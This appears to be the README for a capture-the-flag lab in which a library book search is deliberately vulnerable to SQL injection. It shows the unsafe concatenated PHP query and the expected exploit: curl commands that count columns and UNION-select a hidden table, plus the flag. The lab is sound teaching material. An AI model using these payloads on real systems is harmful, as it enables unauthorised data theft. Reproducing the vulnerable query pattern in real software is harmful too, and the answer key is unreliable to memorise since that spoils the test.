# sqli-v2 — UNION-Based SQL Injection

**Vulnerability:** Book catalogue search is UNION-injectable, leaking a hidden table  
**Tool:** `curl`, `sqlmap`  
**Flag:** `WMG{un10n_b4s3d_sql1_l34ks_th3_db}`

## Scenario

The Athenaeum Library runs a book catalogue at `/search.php?q=<term>`. The PHP
backend runs: `SELECT title, author FROM books WHERE title LIKE '%$q%'` (2 columns).
The query is injectable via UNION: students count columns with `ORDER BY`, then
extract data from a hidden `librarian_notes` table. The flag appears as a fake
book title in the results.

This game is distinct from `sqli-login` (which uses a boolean login bypass).
This game teaches UNION-based data extraction.

## Deploy

```bash
ansible-playbook -i inventory/hosts.ini games/sqli-v2/setup.yml
```

First run: `ok=12 changed=8`  
Second run: `ok=11 changed=1` (Apache restart is intentional)

## Verify

```bash
./agent-harness/verify.sh sqli-v2
```

## Expected exploit

```bash
# Count columns (ORDER BY 2 works, ORDER BY 3 errors)
curl -G http://127.0.0.1/search.php --data-urlencode "q=' ORDER BY 2-- -"

# UNION extract from hidden table
curl -G http://127.0.0.1/search.php \
  --data-urlencode "q=' UNION SELECT note,'x' FROM librarian_notes-- -"
# → WMG{un10n_b4s3d_sql1_l34ks_th3_db}
```

## Training

`training.json` — 9 levels: web enumeration → search endpoint → error-based discovery → column counting → UNION theory → payload → flag extraction → sqlmap → ASSESSMENT.  
MITRE ATT&CK: T1190 (Exploit Public-Facing Application), T1005 (Data from Local System).  
CyberRangeCZ subnet: 10.1.33.0/24
